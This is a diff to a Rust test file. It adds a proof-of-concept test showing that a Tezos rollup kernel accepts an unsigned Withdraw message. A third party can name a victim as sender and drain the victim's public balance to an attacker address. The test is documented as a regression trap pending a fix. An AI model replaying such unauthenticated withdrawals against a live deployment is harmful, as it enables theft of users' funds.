@@ -559,6 +559,114 @@ fn verified_bridge_roundtrip_uses_checked_in_real_proofs() {
     );
 }
 
+/// Adapted PoC (v2) for the withdraw auth gap originally documented in
+/// saroupille/tzel#1. The previous PoC shortcut straight to
+/// `encode_ticket_deposit_message(victim, balance)` to populate the
+/// victim's public balance, but upstream commit
+/// 89834818 ("Bind shield deposits to secret-derived keys") now
+/// rejects any deposit whose recipient key is not `deposit:<32-byte-hex>`,
+/// and the proof-verifier fixture (`verified_bridge_flow.json`) is
+/// currently out of sync with the code on origin/main so the
+/// fixture-based "legitimate unshield first" path can't be exercised
+/// without regenerating the fixture (out of scope for this PoC).
+///
+/// The underlying auth gap — `KernelWithdrawReq` carries only
+/// `{sender, recipient, amount}`, no signature, no proof — is still
+/// present on current master. This test seeds the kernel store
+/// directly to reach the state the legitimate flow would have produced
+/// (victim's public balance is credited, bridge ticketer is configured)
+/// and then shows an unauthenticated Withdraw message drains it.
+///
+/// Seeding directly instead of replaying the full deposit → shield →
+/// unshield sequence:
+///   * The legitimate path would leave exactly the two store entries
+///     we set manually (bridge ticketer + balance at the victim's
+///     key). No other state matters for the Withdraw handler.
+///   * It avoids the proof-verifier fixture drift and keeps the PoC
+///     under `cargo test --test bridge_flow` (no feature flag).
+///   * The end assertion we care about is not "can a user unshield"
+///     but "once some public balance exists, can a third party drain
+///     it without auth" — and that's exactly what the seeded state
+///     tests.
+///
+/// Remove this test once the kernel gains sender authentication on
+/// Withdraw (see design branch `design/tezos-auth-shield-withdraw`).
+#[test]
+fn withdraw_poc_v2_drains_seeded_public_balance_without_auth() {
+    // Kernel store paths — kept private to the kernel src, so we
+    // re-inline them here. If either changes upstream this test will
+    // break loudly, which is what we want: a regression trap.
+    const PATH_BRIDGE_TICKETER: &[u8] = b"/tzel/v1/state/bridge/ticketer";
+    const PATH_BALANCE_PREFIX: &[u8] = b"/tzel/v1/state/balances/by-key/";
+    fn balance_path(addr: &str) -> Vec<u8> {
+        let mut p = Vec::with_capacity(PATH_BALANCE_PREFIX.len() + addr.len() * 2);
+        p.extend_from_slice(PATH_BALANCE_PREFIX);
+        p.extend_from_slice(hex::encode(addr.as_bytes()).as_bytes());
+        p
+    }
+
+    let mut host = TestHost::default();
+
+    // Seed (1): configure the bridge ticketer. Withdraw encodes an
+    // outbox message addressed to this contract; the handler errors out
+    // if the ticketer is not configured.
+    host.write_store(PATH_BRIDGE_TICKETER, sample_ticketer().as_bytes());
+
+    // Seed (2): victim's public rollup balance. This is the state a
+    // legitimate unshield would have left. Any valid tz1 works — we
+    // use bootstrap2's well-known sandbox key so the message is easy
+    // to recognise when eyeballing logs.
+    let victim = "tz1gjaF81ZRRvdzjobyfVNsAeSC6PScjfQwN".to_string();
+    let victim_balance: u64 = 500_001;
+    host.write_store(&balance_path(&victim), &victim_balance.to_le_bytes());
+
+    // Attack: a THIRD party — not the victim, no signature, no proof —
+    // submits an unauthenticated Withdraw that drains the victim's
+    // public balance to an attacker-controlled tz1. The kernel has no
+    // way to tell this message apart from a legitimate owner-submitted
+    // Withdraw because the wire format carries no authentication.
+    let attacker_recipient = sample_l1_receiver().to_string();
+    assert_ne!(attacker_recipient, victim, "attacker must differ from victim");
+
+    host.push_input(
+        6,
+        0,
+        encode_external_kernel_message(KernelInboxMessage::Withdraw(KernelWithdrawReq {
+            sender: victim.clone(),
+            recipient: attacker_recipient.clone(),
+            amount: victim_balance,
+        })),
+    );
+    run_with_host(&mut host);
+
+    // Drain succeeded — the kernel accepted the unauthenticated
+    // withdraw, debited the victim, and enqueued an outbox message
+    // addressed to the attacker. This is the auth gap.
+    match read_last_result(&host).unwrap() {
+        KernelResult::Withdraw(_) => { /* drain succeeded — vulnerability confirmed */ }
+        other => panic!(
+            "expected unauthenticated withdraw to succeed (auth gap); got {:?}",
+            other,
+        ),
+    }
+    let ledger = read_ledger(&host).unwrap();
+    // The kernel either zero-writes the entry or deletes it entirely
+    // when the balance reaches zero; both mean the drain succeeded.
+    match ledger.balances.get(victim.as_str()).copied() {
+        None | Some(0) => {}
+        Some(remaining) => panic!(
+            "victim's public balance should be drained to zero or absent; got {} remaining",
+            remaining,
+        ),
+    }
+    let last_withdrawal = ledger
+        .withdrawals
+        .last()
+        .expect("withdraw must enqueue an outbox message");
+    assert_eq!(last_withdrawal.recipient, attacker_recipient);
+    assert_eq!(last_withdrawal.amount, victim_balance);
+}
+
 #[cfg(feature = "proof-verifier")]
 #[test]
 fn verified_bridge_can_be_configured_via_dal_pointers() {
